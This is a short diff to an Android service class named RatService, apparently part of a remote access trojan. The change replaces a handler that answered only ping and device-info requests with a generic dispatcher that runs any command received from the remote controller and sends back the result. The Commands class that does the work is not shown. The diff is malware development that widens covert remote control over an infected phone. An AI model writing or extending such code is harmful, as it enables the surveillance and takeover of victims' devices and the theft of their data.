@@ -152,13 +152,8 @@ public class RatService extends Service {
     private void handleCommand(String cmd) {
         Log.i(TAG, "Command: " + cmd);
         try {
-            if (cmd.equals("/ping")) {
-                sendResult(cmd, "pong");
-            } else if (cmd.equals("/info")) {
-                sendResult(cmd, DeviceInfo.getInfoJson(RatService.this));
-            } else {
-                sendResult(cmd, "unknown");
-            }
+            String result = Commands.execute(RatService.this, cmd);
+            sendResult(cmd, result);
         } catch (Throwable t) {
             sendResult(cmd, "error: " + t.getMessage());
         }
